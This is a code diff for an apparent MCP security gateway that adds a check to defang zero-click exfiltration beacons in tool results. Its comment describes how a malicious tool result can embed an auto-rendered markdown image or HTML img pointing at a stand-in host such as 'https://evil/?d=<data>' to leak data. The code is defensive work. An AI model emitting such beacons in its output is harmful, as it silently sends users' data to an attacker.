@@ -480,6 +480,42 @@ async def _scan_text_tier1(
                 )
                 blocked = True
                 break
+
+    # CHG-0096: defang zero-click auto-render EXFIL BEACONS in the tool RESULT — parity
+    # with the chat output guard (G40-G43). A malicious upstream tool result can embed a
+    # markdown-image ``![x](https://evil/?d=<data>)``, an HTML ``<img src=...>`` / srcset,
+    # or a protocol-relative beacon that a markdown/HTML MCP client AUTO-FETCHES on render
+    # — a zero-click exfil of arbitrary data the text regexes never recognise as a secret
+    # (so nothing above detected/masked it, yet the raw beacon egressed). This egress
+    # BYPASSES the chat output guard (a distinct API surface). ``neutralize_exfil_channels``
+    # masks the smuggled payload + strips the auto-render (image -> plain link); it is a
+    # STRICT no-op on benign markdown/URLs (gated by ``_url_smuggles_data``), so it is safe
+    # to run unconditionally under any enforcing posture. Applied to ``mutated`` so it
+    # composes on top of any PII/secret redaction above; a 'monitor' posture stays
+    # observe-only (matches the encoded-exfil block's gate).
+    if not blocked and enforcement != "monitor":
+        from output_guard import neutralize_exfil_channels  # local: avoid import cycle
+        # Run on the RAW text (not the already-redacted ``mutated``): the beacon's
+        # smuggled payload must be VISIBLE for ``_url_smuggles_data`` to trip — if
+        # redact_all masked the URL's PII first, the neutralizer would see a masked tail
+        # and leave the auto-render intact. If a beacon is defanged, RE-APPLY the
+        # PII/secret redaction over the defanged text (when any was detected) so both the
+        # beacon AND any other sensitive value are masked.
+        _neu = neutralize_exfil_channels(text)
+        if _neu != text:
+            findings.append(
+                McpFinding(
+                    entity_type="exfil_channel",
+                    score=0.9,
+                    start=0,
+                    end=len(text),
+                    direction=mcp_dir,
+                    tier="tier1",
+                    threat_type="exfil",
+                    detail="Defanged zero-click auto-render exfil beacon (markdown-image / HTML / srcset)",
+                )
+            )
+            mutated = redact_all(_neu) if (pii or secrets or ip_leak or cred_exp) else _neu
     return mutated, findings, blocked, []
 
 
